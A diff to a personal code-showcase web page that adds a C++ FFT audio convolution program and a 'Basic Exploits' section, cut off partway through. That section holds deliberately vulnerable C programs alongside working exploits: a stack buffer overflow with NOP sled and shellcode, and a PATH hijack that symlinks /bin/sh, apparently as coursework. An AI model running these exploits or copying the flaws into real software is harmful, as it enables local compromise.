@@ -20,7 +20,7 @@ body {
   text-align: center;
   background: #001f3f;
   color: #DDDDDD;
-  max-height: 125px;
+  max-height: 100px;
 }
 
 /* Increase the font size of the heading */
@@ -177,8 +177,8 @@ body {
 pre {
   overflow-y: auto;
   overflow-x: hidden;
-  background-color: #898989;
-  border: 0px solid #898989;
+  background-color: white;
+  border: 0px solid white;
   padding-left: 0px;
   max-height: 500px;
   position: relative;
@@ -258,14 +258,16 @@ code {
     padding: 0;
     margin: 0;
     display: none;
+    z-index: 10;
 }
 
 .third-level-menu > li
 {
     height: 30px;
     background: #001f3f;
+    z-index: 10;
 }
-.third-level-menu > li:hover { background: #CCCCCC; }
+.third-level-menu > li:hover { background: #CCCCCC; z-index: 10; }
 
 .second-level-menu
 {
@@ -277,6 +279,7 @@ code {
     padding: 0;
     margin: 0;
     display: none;
+    z-index: 10;
 }
 
 .second-level-menu > li
@@ -284,14 +287,16 @@ code {
     position: relative;
     height: 30px;
     background: #001f3f;
+    z-index: 10;
 }
-.second-level-menu > li:hover { background: #CCCCCC; }
+.second-level-menu > li:hover { background: #CCCCCC; z-index: 10; }
 
 .top-level-menu
 {
     list-style: none;
     padding: 0;
     margin: 0;
+    z-index: 10;
 }
 
 .top-level-menu > li
@@ -301,13 +306,15 @@ code {
     height: 30px;
     width: 100px;
     background: #001f3f;
+    z-index: 10;
 }
-.top-level-menu > li:hover { background: #CCCCCC; }
+.top-level-menu > li:hover { background: #CCCCCC; z-index: 10; }
 
 .top-level-menu li:hover > ul
 {
     /* On hover, display the next level's menu */
     display: inline;
+    z-index: 10;
 }
 
 
@@ -392,12 +399,35 @@ code {
     </li>
     <li>
     	<a href="#">C</a>
+    	<ul class="second-level-menu">
+    		<li>
+    			<a href="#">Basic Exploits</a>
+    			<ul class="third-level-menu">
+    				<li><a href="javascript:;" id="bof" onclick="showVis(this);return false;">bof.c</a></li>
+    				<li><a href="javascript:;" id="sbof" onclick="showVis(this);return false;">sploit_bof.c</a></li>
+    				<li><a href="javascript:;" id="env" onclick="showVis(this);return false;">env.c</a></li>
+    				<li><a href="javascript:;" id="senv" onclick="showVis(this);return false;">sploit_env.c</a></li>
+    				<li><a href="javascript:;" id="toc" onclick="showVis(this);return false;">tocttou.c</a></li>
+    				<li><a href="javascript:;" id="stoc" onclick="showVis(this);return false;">sploit_tocttou.c</a></li>
+    				<li><a href="javascript:;" id="fmt" onclick="showVis(this);return false;">format.c</a></li>
+    				<li><a href="javascript:;" id="sfmt" onclick="showVis(this);return false;">sploit_format.c</a></li>
+    			</ul>
+    		</li>
+    	</ul>
     </li>
     <li>
     	<a href="#">C++</a>
+    	<ul class="second-level-menu">
+    		<li>
+    			<a href="#">Audio Convolution</a>
+    			<ul class="third-level-menu">
+    				<li><a href="javascript:;" id="AC" onclick="showVis(this);return false;">convolve.cpp</a></li>
+    			</ul>
+    		</li>
+    	</ul>
     </li>
 </ul>
-<div style="background-color: #898989; position: inherit;">
+<div style="background-color: white; position: inherit;">
 	<div id="javaSec1" style="display: none; overflow-y: scroll; width: 1000px; padding-left: 50px;">
 	<pre>
 <code class="java" style="overflow-x: hidden;">
@@ -902,7 +932,6 @@ code {
 	}
 </code>
 	</pre>
-	
 	</div>
 
 	<div id="javaSec3" style="display: none; overflow-y: scroll; width: 1000px; padding-left: 50px;">
@@ -3995,6 +4024,835 @@ code {
 </code>
 	</pre>
 	</div>
+
+	<div id="cppSec1" style="display: none; overflow-y: scroll; width: 1000px; padding-left: 50px;">
+	<pre>
+<code class="c++" style="overflow-x: hidden;">
+	#include &ltiostream&gt
+	#include &ltiterator&gt
+	#include &ltfstream&gt
+	#include &ltmath.h&gt
+	#include &ltcstring&gt
+	#include "WAV.h"
+	using namespace std;
+
+	/*
+	To run pre-FFT version of the program:
+	    g++ convolveInit.cpp Wav.cpp -o convolve
+	    ./convolve FluteDry.wav l960large_brite_hall.wav output.wav
+
+	To run all other versions:
+	    g++ convolveFFTVersion#.cpp Wav.pp -o convolve
+	    ./convolve FluteDry.wav l960large_brite_hall.wav output.wav FFT
+	    OR
+	    ./convolve FluteDry.wav l960large_brite_hall.wav output.wav F
+	    OR
+	    ./convolve FluteDry.wav l960large_brite_hall.wav output.wav N -- FOR REGULAR SLOW ALGORITHM
+	*/
+	void makeNewWAV(char *outputWAV);
+	bool isWave(char* file);
+	void convolution(double* inputSignal, int inputSize, double* irSignal, int irSize, double* outputSignal, int outputSize);
+	void makeNewWAVFFT(char* outputWAV);
+	void CooleyTukey(double* nonDiscreteData, long dimensions);
+	void CooleyTukey2(double* Data1, double* Data2, long dimensions);
+
+	WAV* dryWav;
+	WAV* pulseWav;
+	int main(int argc, char * argv[]) {
+	    printf("To run pre-FFT version of the program:\\ng++ convolveInit.cpp Wav.cpp -o convolve\\n./convolve FluteDry.wav l960large_brite_hall.wav output.wav\\n\\nTo run all other versions:\\ng++ convolveFFTVersion#.cpp Wav.pp -o convolve\\n./convolve FluteDry.wav l960large_brite_hall.wav output.wav FFT\\nOR\\n./convolve FluteDry.wav l960large_brite_hall.wav output.wav F\\nOR\\n./convolve FluteDry.wav l960large_brite_hall.wav output.wav N -- FOR REGULAR SLOW ALGORITHM\\n");
+
+	    if(argc &lt 4){
+	        printf("Program usage: ./convolve input.wav IRfile.wav output.wav [ ,N,FFT/F]\\n");
+	        exit(EXIT_FAILURE);
+	    }
+	    char* inputWAV;
+	    char* irWAV;
+	    char* outputWAV;
+	    char* algorithm;
+	    inputWAV = argv[1];
+	    irWAV = argv[2];
+	    outputWAV = argv[3];
+	    bool result = false;
+	    int size = argc;
+	    if(argc == 5) {
+	        algorithm = argv[4];
+	        for(int i = 1; i &lt size-1; i++){
+	            if(isWave(argv[i])){
+	                result = true;
+	            }
+	            else{
+	                result = false;
+	                break;
+	            }
+	        }
+	    }
+	    else {
+	        algorithm = const_cast&ltchar *&gt("N");
+	        for(int i = 1; i &lt size; i++){
+	            if(isWave(argv[i])){
+	                result = true;
+	            }
+	            else{
+	                result = false;
+	                break;
+	            }
+	        }
+	    }
+	    if(!result){
+	        printf("One of the files not of right type. All files should be of type .wav\\n");
+	        printf("To run pre-FFT version of the program:\\ng++ convolveInit.cpp Wav.cpp -o convolve\\n./convolve FluteDry.wav l960large_brite_hall.wav output.wav\\n\\nTo run all other versions:\\ng++ convolveFFTVersion#.cpp Wav.pp -o convolve\\n./convolve FluteDry.wav l960large_brite_hall.wav output.wav FFT\\nOR\\n./convolve FluteDry.wav l960large_brite_hall.wav output.wav F\\nOR\\n./convolve FluteDry.wav l960large_brite_hall.wav output.wav N -- FOR REGULAR SLOW ALGORITHM\\n");
+	        exit(EXIT_FAILURE);
+	    }
+	    //Create wav files, need to do a bit of reading as to what makes up a wav files.
+	    dryWav = new WAV();
+	    dryWav-&gtcreateWAV(inputWAV);
+	    dryWav-&gtprintData(inputWAV);
+	    pulseWav = new WAV();
+	    pulseWav-&gtcreateWAV(irWAV);
+	    pulseWav-&gtprintData(irWAV);
+	    printf("Successfully created input WAVS\\n");
+	    fflush(stdout);
+	    printf("Creating convoluted WAV now...\\n");
+	    if(*algorithm == 'N')
+	        makeNewWAV(outputWAV);
+	    else if(*algorithm == 'F')
+	        makeNewWAVFFT(outputWAV);
+
+	    exit(EXIT_SUCCESS);
+
+	}
+
+	void makeNewWAVFFT(char* outputWAV){
+	    double* dryConvolve = new double[dryWav-&gtsigSize];
+	    double* pulseConvolve = new double[pulseWav-&gtsigSize];
+	    int dryFreq = dryWav-&gt sigSize;
+	    int pulseFreq = pulseWav-&gt sigSize;
+	    int size = dryWav-&gtsigSize + pulseWav-&gtsigSize - 1;
+	    long dimensions = 1;
+	    int freqSize = 0;
+	    if(dryFreq &lt= pulseFreq)
+	        freqSize = pulseFreq;
+	    else
+	        freqSize = dryFreq;
+
+	    for(int i = 0; i &lt dryFreq; i++){
+	        //dryConvolve[i] = (double) dryWav-&gtsignal[i] / 32678.0;
+	        dryConvolve[i] = (double)(dryWav-&gtsignal[i] &lt&lt 15);
+	    }
+	    for(int i = 0; i &lt pulseFreq; i++){
+	        //pulseConvolve[i] = ((double)pulseWav-&gtsignal[i]/(double)32678.0);
+	        pulseConvolve[i] = (double)(pulseWav-&gtsignal[i] &lt&lt 15);
+	    }
+
+	    //Now we need to make sure the length is a power of 2 because FFT requires this to work
+	    /*for(int i = 0; i &lt freqSize+1; i++){
+	        dimensions = dimensions * 2;
+	    }*/
+	    while(dimensions &lt freqSize){
+	        dimensions = dimensions &lt&lt 1;
+	    }
+	    dimensions = dimensions &lt&lt 1;
+
+	    double* X = new double[dimensions];
+	    double* H = new double[dimensions];
+	    double* Y = new double[dimensions];
+	    for(int i  = 0; i &lt dimensions; i++){
+	        X[i] = 0.0;
+	        H[i] = 0.0;
+	        Y[i] = 0.0;
+
+	    }
+	    for(int i = 0; i &lt dryFreq; i++){
+	        X[i*2] = dryConvolve[i];
+	    }
+
+	    for(int i = 0; i &lt pulseFreq; i++){
+	        H[i*2] = pulseConvolve[i];
+	    }
+	    //CooleyTukey(X-1, dimensions/2, 1);
+	    //CooleyTukey(H-1, dimensions/2, 1);
+	    CooleyTukey2(X-1,H-1,dimensions/2);
+	    for(int i = 0; i &lt dimensions; i+= 2){
+	        Y[i] = X[i] * H[i] - X[i+1] * H[i+1]; //real
+	        Y[i+1] = X[i+1] * H[i] + X[i] * H[i+1]; //complex
+	    }
+	    CooleyTukey(Y-1, dimensions/2);
+
+	    double* toConvolve = new double[size];
+	    double maxSig = 0.0;
+	    for(int i = 0; i &lt size; i++){
+	        double oneByte = Y[i*2];
+	        toConvolve[i] = oneByte;
+	        if(oneByte &lt 0.0){
+	            oneByte = oneByte * -1.0;
+	        }
+	        if(maxSig &lt oneByte){
+	            maxSig = oneByte;
+	        }
+	    }
+	    double dryMax = 0.0;
+	    double sigMax = 0.0;
+	    for(int i = 0; i &lt size; i++){
+	        if(dryWav-&gtsignal[i] &gt dryMax)
+	            dryMax = dryWav-&gtsignal[i];
+	        if(toConvolve[i] &gt sigMax)
+	            sigMax = toConvolve[i];
+	    }
+	    for(int i  = 0; i &lt size; i++){
+	        toConvolve[i] = toConvolve[i] / sigMax*dryMax;
+	    }
+	    short* outSig = new short[size];
+	    for(int i = 0; i &lt size; i++){
+	        outSig[i] = static_cast&ltshort&gt(toConvolve[i]);
+	    }
+
+	    printf("Writing data to file...\\n");
+	    FILE* myNewWave = fopen(outputWAV, "wb");
+	    unsigned char charFourArray[4];
+	    unsigned char charTwoArray[2];
+	    fputs("RIFF", myNewWave);
+	    int chunkData = (dryWav-&gtchannels * size * (dryWav-&gtbps/8) + 36 + 36);
+	    charFourArray[3] = (unsigned char)((chunkData &gt&gt 24) & 0xFF);
+	    charFourArray[2] = (unsigned char)((chunkData &gt&gt 16) & 0xFF);
+	    charFourArray[1] = (unsigned char)((chunkData &gt&gt 8) & 0xFF);
+	    charFourArray[0] = (unsigned char)(chunkData & 0xFF);
+	    fwrite(charFourArray, sizeof(unsigned char), 4, myNewWave);
+	    fputs("WAVE", myNewWave);
+	    fputs("fmt ", myNewWave);
+
+	    charFourArray[3] = (unsigned char)((16 &gt&gt 24) & 0xFF);
+	    charFourArray[2] = (unsigned char)((16 &gt&gt 16) & 0xFF);
+	    charFourArray[1] = (unsigned char)((16 &gt&gt 8) & 0xFF);
+	    charFourArray[0] = (unsigned char)(16 & 0xFF);
+	    fwrite(charFourArray, sizeof(unsigned char), 4, myNewWave);
+
+	    charTwoArray[1] = (unsigned char)((1 &gt&gt 8) & 0xFF);
+	    charTwoArray[0] = (unsigned char)(1 & 0xFF);
+	    fwrite(charTwoArray, sizeof(unsigned char), 2, myNewWave);
+
+	    charTwoArray[1] = (unsigned char)((dryWav-&gtchannels &gt&gt 8) & 0xFF);
+	    charTwoArray[0] = (unsigned char)(dryWav-&gtchannels & 0xFF);
+	    fwrite(charTwoArray, sizeof(unsigned char), 2, myNewWave);
+
+	    charFourArray[3] = (unsigned char)((dryWav-&gtsample &gt&gt 24) & 0xFF);
+	    charFourArray[2] = (unsigned char)((dryWav-&gtsample &gt&gt 16) & 0xFF);
+	    charFourArray[1] = (unsigned char)((dryWav-&gtsample &gt&gt 8) & 0xFF);
+	    charFourArray[0] = (unsigned char)(dryWav-&gtsample & 0xFF);
+	    fwrite(charFourArray, sizeof(unsigned char), 4, myNewWave);
+
+	    charFourArray[3] = (unsigned char)((dryWav-&gtchannels * (dryWav-&gtbps/8) * dryWav-&gtsample &gt&gt 24) & 0xFF);
+	    charFourArray[2] = (unsigned char)((dryWav-&gtchannels * (dryWav-&gtbps/8) * dryWav-&gtsample &gt&gt 16) & 0xFF);
+	    charFourArray[1] = (unsigned char)((dryWav-&gtchannels * (dryWav-&gtbps/8) * dryWav-&gtsample &gt&gt 8) & 0xFF);
+	    charFourArray[0] = (unsigned char)(dryWav-&gtchannels * (dryWav-&gtbps/8) * dryWav-&gtsample & 0xFF);
+	    fwrite(charFourArray, sizeof(unsigned char), 4, myNewWave);
+
+	    charTwoArray[1] = (unsigned char)((dryWav-&gtchannels * (dryWav-&gtbps/8) &gt&gt 8) & 0xFF);
+	    charTwoArray[0] = (unsigned char)(dryWav-&gtchannels * (dryWav-&gtbps/8) & 0xFF);
+	    fwrite(charTwoArray, sizeof(unsigned char), 2, myNewWave);
+
+	    charTwoArray[1] = (unsigned char)((dryWav-&gtbps &gt&gt 8) & 0xFF);
+	    charTwoArray[0] = (unsigned char)((dryWav-&gtbps) & 0xFF);
+	    fwrite(charTwoArray, sizeof(unsigned char), 2, myNewWave);
+
+	    fputs("data", myNewWave);
+
+	    charFourArray[3] = (unsigned char)(((dryWav-&gtchannels * size * (dryWav-&gtbps/8)) &gt&gt 24) & 0xFF);
+	    charFourArray[2] = (unsigned char)(((dryWav-&gtchannels * size * (dryWav-&gtbps/8)) &gt&gt 16) & 0xFF);
+	    charFourArray[1] = (unsigned char)(((dryWav-&gtchannels * size * (dryWav-&gtbps/8)) &gt&gt 8) & 0xFF);
+	    charFourArray[0] = (unsigned char)((dryWav-&gtchannels * size * (dryWav-&gtbps/8)) & 0xFF);
+	    fwrite(charFourArray, sizeof(unsigned char), 4, myNewWave);
+
+	    for(int i = 0; i &lt size; i++){
+	        charTwoArray[1] = static_cast&ltunsigned char&gt((outSig[i] &gt&gt 8) & 0xFF);
+	        charTwoArray[0] = (unsigned char) (outSig[i] & 0xFF);
+	        fwrite(charTwoArray, sizeof(unsigned char), 2, myNewWave);
+	    }
+	    fclose(myNewWave);
+	    printf("File created successfully...\\n");
+	}
+	void CooleyTukey2(double* Data1, double* Data2, long dimensions){
+	    unsigned long n, mmax, m, j, istep, i;
+	    double wtemp, wr, wpr, wpi, wi, theta;
+	    double tempr, tempi;
+	    float PI = static_cast&ltfloat&gt(3.141592653589793);
+
+	    n = static_cast&ltunsigned long&gt(dimensions &lt&lt 1);
+	    j=1;
+	    for (i=1; i &lt n; i+=2) {
+	        if (j&gti) {
+	            double placeholder = Data1[j];
+	            Data1[j] = Data1[i];
+	            Data1[i] = placeholder;
+
+	            placeholder = Data1[j+1];
+	            Data1[j+1] = Data1[i+1];
+	            Data1[i+1] = placeholder;
+
+	            placeholder = Data2[j];
+	            Data2[j] = Data2[i];
+	            Data2[i] = placeholder;
+
+	            placeholder = Data2[j+1];
+	            Data2[j+1] = Data2[i+1];
+	            Data2[i+1] = placeholder;
+	        }
+	        m = static_cast&ltunsigned long&gt(dimensions);
+	        while (m&gt=2 && j&gtm) {
+	            j -= m;
+	            m &gt&gt= 1;
+	        }
+
+	        j += m;
+	    }
+	    mmax=2;
+	    while (n&gtmmax) {
+	        istep = mmax&lt&lt 1;
+	        theta = (2*PI/mmax);
+	        wtemp = sin(0.5*theta);
+	        wpr = -2.0*wtemp*wtemp;
+	        wpi = sin(theta);
+	        wr = 1.0;
+	        wi = 0.0;
+	        for (m=1; m &lt mmax; m += 2) {
+	            for (i=m; i &lt= n; i += istep) {
+	                j=i+mmax;
+	                tempr = wr*Data1[j] - wi*Data1[j+1];
+	                tempi = wr * Data1[j+1] + wi*Data1[j];
+
+	                Data1[j] = Data1[i] - tempr;
+	                Data1[j+1] = Data1[i+1] - tempi;
+	                Data1[i] += tempr;
+	                Data1[i+1] += tempi;
+
+	                tempr = wr*Data2[j] - wi*Data2[j+1];
+	                tempi = wr*Data2[j+1] + wi*Data2[j];
+
+	                Data2[j] = Data2[i] - tempr;
+	                Data2[j+1] = Data2[i+1] - tempi;
+	                Data2[i] += tempr;
+	                Data2[i+1] += tempi;
+	            }
+	            wtemp=wr;
+	            wr += wr*wpr - wi*wpi;
+	            wi += wi*wpr + wtemp*wpi;
+	        }
+	        mmax=istep;
+	    }
+	}
+	/*
+	 * This algorithm was created by Cooley and Tukey (1965)
+	 * I CLAIM NO CREDIT FOR THIS ALGORITHM, ITS JUST REALLY EFFICIENT TO USE
+	 */
+	void CooleyTukey(double* nonDiscreteData, long dimensions) {
+	    unsigned long n, mmax, m, j, istep, i;
+	    double wtemp, wr, wpr, wpi, wi, theta;
+	    double tempr, tempi;
+	    float PI = static_cast&ltfloat&gt(3.141592653589793);
+
+	    n = static_cast&ltunsigned long&gt(dimensions &lt&lt 1);
+	    j=1;
+	    for (i=1; i &lt n; i+=2) {
+	        if (j&gti) {
+	            double placeholder = nonDiscreteData[j];
+	            nonDiscreteData[j] = nonDiscreteData[i];
+	            nonDiscreteData[i] = placeholder;
+
+	            placeholder = nonDiscreteData[j+1];
+	            nonDiscreteData[j+1] = nonDiscreteData[i+1];
+	            nonDiscreteData[i+1] = placeholder;
+	        }
+	        m = static_cast&ltunsigned long&gt(dimensions);
+	        while (m&gt=2 && j&gtm) {
+	            j -= m;
+	            m &gt&gt= 1;
+	        }
+
+	        j += m;
+	    }
+	    mmax=2;
+	    while (n&gtmmax) {
+	        istep = mmax&lt&lt 1;
+	        theta = -1*(2*PI/mmax);
+	        wtemp = sin(0.5*theta);
+	        wpr = -2.0*wtemp*wtemp;
+	        wpi = sin(theta);
+	        wr = 1.0;
+	        wi = 0.0;
+	        for (m=1; m &lt mmax; m += 2) {
+	            for (i=m; i &lt= n; i += istep) {
+	                j=i+mmax;
+	                tempr = wr*nonDiscreteData[j] - wi*nonDiscreteData[j+1];
+	                tempi = wr * nonDiscreteData[j+1] + wi*nonDiscreteData[j];
+
+	                nonDiscreteData[j] = nonDiscreteData[i] - tempr;
+	                nonDiscreteData[j+1] = nonDiscreteData[i+1] - tempi;
+	                nonDiscreteData[i] += tempr;
+	                nonDiscreteData[i+1] += tempi;
+	            }
+	            wtemp=wr;
+	            wr += wr*wpr - wi*wpi;
+	            wi += wi*wpr + wtemp*wpi;
+	        }
+	        mmax=istep;
+	    }
+	}
+
+	void makeNewWAV(char* outputWAV){
+
+	    int size = dryWav-&gtsigSize + pulseWav-&gtsigSize - 1;
+	    short* outSig = new short[size];
+	    double* toConvolve = new double[size];
+	    double* dryConvolve = new double[dryWav-&gtsigSize];
+	    double* pulseConvolve = new double[pulseWav-&gtsigSize];
+
+	    for(int i = 0; i &lt dryWav-&gt sigSize; i++){
+	        dryConvolve[i] = (double) dryWav-&gtsignal[i] / 32678.0;
+	        //dryConvolve[i] = dryWav-&gtsignal[i] &lt&lt 15;
+	    }
+	    for(int i = 0; i &lt pulseWav-&gt sigSize; i++){
+	        pulseConvolve[i] = ((double)pulseWav-&gtsignal[i]/(double)32678.0);
+	        //pulseConvolve[i] = pulseWav-&gtsignal[i] &lt&lt 15;
+	    }
+	    printf("Performing convolution...\\n");
+	    convolution(dryConvolve, dryWav-&gtsigSize, pulseConvolve, pulseWav-&gtsigSize, toConvolve, size);
+	    printf("Convolution successful...\\n");
+	    double dryMax = 0.0;
+	    double sigMax = 0.0;
+
+	    //check for max value in both original and output signals
+	    for(int i = 0; i &lt size; i++){
+	        if(dryWav-&gtsignal[i] &gt dryMax)
+	            dryMax = dryWav-&gtsignal[i];
+	        if(toConvolve[i] &gt sigMax)
+	            sigMax = toConvolve[i];
+	    }
+	    for(int i  = 0; i &lt size; i++){
+	        toConvolve[i] = toConvolve[i] / sigMax * dryMax;
+	    }
+
+
+	    for(int i = 0; i &lt size; i++){
+	        outSig[i] = static_cast&ltshort&gt(toConvolve[i]);
+	    }
+	    printf("Writing data to file...\\n");
+	    FILE* myNewWave = fopen(outputWAV, "wb");
+
+	    fputs("RIFF", myNewWave);
+	    unsigned char charFourArray[4];
+	    unsigned char charTwoArray[2];
+	    int chunkData = (dryWav-&gtchannels * size * (dryWav-&gtbps/8) + 36);
+	    charFourArray[3] = (unsigned char)((chunkData &gt&gt 24) & 0xFF);
+	    charFourArray[2] = (unsigned char)((chunkData &gt&gt 16) & 0xFF);
+	    charFourArray[1] = (unsigned char)((chunkData &gt&gt 8) & 0xFF);
+	    charFourArray[0] = (unsigned char)(chunkData & 0xFF);
+	    fwrite(charFourArray, sizeof(unsigned char), 4, myNewWave);
+	    fputs("WAVE", myNewWave);
+	    fputs("fmt ", myNewWave);
+
+	    charFourArray[3] = (unsigned char)((16 &gt&gt 24) & 0xFF);
+	    charFourArray[2] = (unsigned char)((16 &gt&gt 16) & 0xFF);
+	    charFourArray[1] = (unsigned char)((16 &gt&gt 8) & 0xFF);
+	    charFourArray[0] = (unsigned char)(16 & 0xFF);
+	    fwrite(charFourArray, sizeof(unsigned char), 4, myNewWave);
+
+	    charTwoArray[1] = (unsigned char)((1 &gt&gt 8) & 0xFF);
+	    charTwoArray[0] = (unsigned char)(1 & 0xFF);
+	    fwrite(charTwoArray, sizeof(unsigned char), 2, myNewWave);
+
+	    charTwoArray[1] = (unsigned char)((dryWav-&gtchannels &gt&gt 8) & 0xFF);
+	    charTwoArray[0] = (unsigned char)(dryWav-&gtchannels & 0xFF);
+	    fwrite(charTwoArray, sizeof(unsigned char), 2, myNewWave);
+
+	    charFourArray[3] = (unsigned char)((dryWav-&gtsample &gt&gt 24) & 0xFF);
+	    charFourArray[2] = (unsigned char)((dryWav-&gtsample &gt&gt 16) & 0xFF);
+	    charFourArray[1] = (unsigned char)((dryWav-&gtsample &gt&gt 8) & 0xFF);
+	    charFourArray[0] = (unsigned char)(dryWav-&gtsample & 0xFF);
+	    fwrite(charFourArray, sizeof(unsigned char), 4, myNewWave);
+
+	    charFourArray[3] = (unsigned char)((dryWav-&gtchannels * (dryWav-&gtbps/8) * dryWav-&gtsample &gt&gt 24) & 0xFF);
+	    charFourArray[2] = (unsigned char)((dryWav-&gtchannels * (dryWav-&gtbps/8) * dryWav-&gtsample &gt&gt 16) & 0xFF);
+	    charFourArray[1] = (unsigned char)((dryWav-&gtchannels * (dryWav-&gtbps/8) * dryWav-&gtsample &gt&gt 8) & 0xFF);
+	    charFourArray[0] = (unsigned char)(dryWav-&gtchannels * (dryWav-&gtbps/8) * dryWav-&gtsample & 0xFF);
+	    fwrite(charFourArray, sizeof(unsigned char), 4, myNewWave);
+
+	    charTwoArray[1] = (unsigned char)((dryWav-&gtchannels * (dryWav-&gtbps/8) &gt&gt 8) & 0xFF);
+	    charTwoArray[0] = (unsigned char)(dryWav-&gtchannels * (dryWav-&gtbps/8) & 0xFF);
+	    fwrite(charTwoArray, sizeof(unsigned char), 2, myNewWave);
+
+	    charTwoArray[1] = (unsigned char)((dryWav-&gtbps &gt&gt 8) & 0xFF);
+	    charTwoArray[0] = (unsigned char)((dryWav-&gtbps) & 0xFF);
+	    fwrite(charTwoArray, sizeof(unsigned char), 2, myNewWave);
+
+	    fputs("data", myNewWave);
+
+	    charFourArray[3] = (unsigned char)(((dryWav-&gtchannels * size * (dryWav-&gtbps/8)) &gt&gt 24) & 0xFF);
+	    charFourArray[2] = (unsigned char)(((dryWav-&gtchannels * size * (dryWav-&gtbps/8)) &gt&gt 16) & 0xFF);
+	    charFourArray[1] = (unsigned char)(((dryWav-&gtchannels * size * (dryWav-&gtbps/8)) &gt&gt 8) & 0xFF);
+	    charFourArray[0] = (unsigned char)((dryWav-&gtchannels * size * (dryWav-&gtbps/8)) & 0xFF);
+	    fwrite(charFourArray, sizeof(unsigned char), 4, myNewWave);
+
+	    for(int i = 0; i &lt size; i++){
+	        charTwoArray[1] = static_cast&ltunsigned char&gt((outSig[i] &gt&gt 8) & 0xFF);
+	        charTwoArray[0] = (unsigned char) (outSig[i] & 0xFF);
+	        fwrite(charTwoArray, sizeof(unsigned char), 2, myNewWave);
+	    }
+	    fclose(myNewWave);
+	    printf("File created successfully...\\n");
+	}
+
+	void convolution(double* inputSignal, int inputSize, double* irSignal, int irSize, double* outputSignal, int outputSize) {
+	    int n,m;
+
+	    if(outputSize != (inputSize + irSize - 1)){
+	        printf("Signal is of wrong size. Exiting now");
+	        exit(EXIT_FAILURE);
+	    }
+
+	    for(n = 0; n &lt outputSize; n++){
+	        outputSignal[n] = 0.0;
+	    }
+
+	    for(n = 0; n &lt inputSize; n++){
+	        for(m = 0; m &lt irSize; m++){
+	            outputSignal[n+m] += inputSignal[n] * irSignal[m];
+	        }
+	        if(n == (inputSize/10)){
+	            printf("\tConvolution at 10 percent...\\n");
+	            fflush(stdout);
+	        }
+	        else if(n == (2*inputSize/10)){
+	            printf("\tConvolution at 20 percent...\\n");
+	            fflush(stdout);
+	        }
+	        else if(n == (3*inputSize/10)){
+	            printf("\tConvolution at 30 percent...\\n");
+	            fflush(stdout);
+	        }
+	        else if(n == (4*inputSize/10)){
+	            printf("\tConvolution at 40 percent...\\n");
+	            fflush(stdout);
+	        }
+	        else if(n == (5*inputSize/10)){
+	            printf("\tConvolution at 50 percent...\\n");
+	            fflush(stdout);
+	        }
+	        else if(n == (6*inputSize/10)){
+	            printf("\tConvolution at 60 percent...\\n");
+	            fflush(stdout);
+	        }
+	        else if(n == (7*inputSize/10)){
+	            printf("\tConvolution at 70 percent...\\n");
+	            fflush(stdout);
+	        }
+	        else if(n == (8*inputSize/10)){
+	            printf("\tConvolution at 80 percent...\\n");
+	            fflush(stdout);
+	        }
+	        else if(n == (9*inputSize/10)){
+	            printf("\tConvolution at 90 percent...\\n");
+	            fflush(stdout);
+	        }
+	    }
+	}
+
+	bool isWave(char* file) {
+	    char* pos = strrchr(file, '.');
+	    return strcmp(pos, ".wav") == 0;
+	}
+</code>
+	</pre>
+	</div>
+
+	<div id="cSec1" style="display: none; overflow-y: scroll; width: 1000px; padding-left: 50px;">
+	<pre>
+<code class="c++" style="overflow-x: hidden;">
+	#include <stdio.h>     // printf, fopen, fread, FILE, stderr
+	#include <string.h>    // memcpy
+	#include "shellcode.h" // x86-64 shellcode
+
+	int main(int argc, char * argv[])
+	{
+	    char buffer[256];
+	    char str[256+32];
+	    FILE * boffile = fopen("boffile", "r");
+	    printf(" %p \n", &buffer[0]);
+	    printf(" %p \n", &str[0]);
+	    if (boffile == NULL)
+	    {
+	        perror("fopen failed");
+	        return 1;
+	    }
+	    size_t bytes_read = fread(str, sizeof(char), sizeof(str), boffile);
+	    if (bytes_read != sizeof(str))
+	    {
+	        fprintf(stderr, "fread didn't find enough bytes\n");
+	        return 1;
+	    }
+
+	    memcpy(buffer, str, sizeof(str));
+
+	    printf("Returning from main\n");
+	    return 0;
+	}
+</code>
+	</pre>
+	</div>
+
+	<div id="cSec2" style="display: none; overflow-y: scroll; width: 1000px; padding-left: 50px;">
+	<pre>
+<code class="c++" style="overflow-x: hidden;">
+	#include <stdio.h>
+	#include <string.h>
+	#include <stdlib.h>
+	#include <unistd.h>
+	#include "shellcode.h"
+	int main(){
+	    FILE * boffile = fopen("boffile", "w");
+	    char buffer[256 + 32];
+	    char * pointer;
+	    int size = 288;
+
+	    memset(&buffer, 0x90, 288);
+	    pointer = buffer + 254 - strlen(shellcode);
+	    memcpy(pointer, shellcode, strlen(shellcode));
+	    unsigned char retadd[8] = "\x40\xdf\xff\xff\x7f\x00\x00";
+	    pointer = buffer + 280;
+	    memcpy(pointer, retadd, 8);
+	    fwrite(buffer, size, 1, boffile);
+	    fclose(boffile);
+
+	    char * argv = {"./bof", NULL};
+	    execvp("./bof", argv);
+
+	    return 0;
+	}
+</code>
+	</pre>
+	</div>
+
+	<div id="cSec3" style="display: none; overflow-y: scroll; width: 1000px; padding-left: 50px;">
+	<pre>
+<code class="c++" style="overflow-x: hidden;">
+	#include <stdio.h>  // printf, fflush
+	#include <unistd.h> // execvp
+
+	int main(int argc, char * argv[])
+	{
+	    if (argc < 2)
+	    {
+	        printf("Usage: %s message\n", argv[0]);
+	        return 1;
+	    }
+	    const char * cmd = "echo";
+	    printf(" -> Invoking %s: ", cmd);
+	    fflush(stdout);
+
+	    char * args[] = { "echo", argv[1], NULL };
+	    execvp("echo", args);
+
+	    return 0;
+	}
+</code>
+	</pre>
+	</div>
+
+	<div id="cSec4" style="display: none; overflow-y: scroll; width: 1000px; padding-left: 50px;">
+	<pre>
+<code class="c++" style="overflow-x: hidden;">
+	#include <stdio.h>
+	#include <string.h>
+	#include <stdlib.h>
+	#include <unistd.h>
+	#include <stddef.h>
+
+	int main(){
+	    unlink("./echo");
+	    symlink("/bin/sh", "./echo");
+	    putenv("PATH=.:/usr/local/bin:/usr/bin:/bin");
+	    execl("./env", "env", "-i", NULL);
+	    return 0;
+	}
+</code>
+	</pre>
+	</div>
+
+	<div id="cSec5" style="display: none; overflow-y: scroll; width: 1000px; padding-left: 50px;">
+	<pre>
+<code class="c++" style="overflow-x: hidden;">
+	#include <sys/stat.h>  // sruct stat, stat
+	#include <unistd.h>    // sleep
+	#include <stdio.h>     // printf, snprintf, fflush, stdout
+	#include <string.h>    // strlen
+	#include <stdlib.h>    // system
+
+	int additional_security_checks()
+	{
+	    printf("Performing security checks...");
+	    fflush(stdout);
+	    //TODO: Implement this function; for now we pretend to do something
+	    //useful.
+	    sleep(2);
+	    printf("everything looks good! :)\n");
+	    return 0;
+	}
+
